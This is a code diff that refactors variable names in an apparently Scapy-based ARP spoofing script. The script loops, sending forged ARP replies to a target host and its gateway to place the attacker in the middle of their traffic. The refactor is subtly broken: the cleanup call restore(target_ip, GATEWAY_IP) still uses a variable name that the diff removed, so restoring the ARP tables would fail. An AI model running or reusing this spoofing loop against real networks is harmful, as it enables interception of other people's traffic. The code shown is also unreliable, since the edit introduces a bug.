@@ -48,15 +48,14 @@ def spoof(target_ip, spoof_ip, verbose=True):
     arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     send(arp_response, verbose=0)
     if verbose:
-        # self_mac = ARP().hwsrc
         print(f"[+] Sent to {target_ip} : {spoof_ip} is at {arp_response.hwsrc}")
 
 
 if __name__ == "__main__":
     arguments = get_arguments()
     
-    TARGET_IP = arguments.target
-    GATEWAY_IP = arguments.gateway
+    target_ip = arguments.target
+    gateway_ip = arguments.gateway
     verbose = arguments.verbose
     
     try:
@@ -68,14 +67,14 @@ if __name__ == "__main__":
 
     try:
         while True:
-            spoof(TARGET_IP, GATEWAY_IP, verbose)
-            spoof(GATEWAY_IP, TARGET_IP, verbose)
+            spoof(target_ip, gateway_ip, verbose)
+            spoof(gateway_ip, target_ip, verbose)
             sleep(1)
     except PermissionError:
         print("[-] You requested ARP creation which requires root privileges. QUITTING!")
     except KeyboardInterrupt:
         print("\n\n[-] Detected CTRL+C ... Resetting ARP tables ... Please Wait.")
-        restore(TARGET_IP, GATEWAY_IP)
-        restore(GATEWAY_IP, TARGET_IP)
+        restore(target_ip, GATEWAY_IP)
+        restore(gateway_ip, target_ip)
     finally:
         sys.exit()
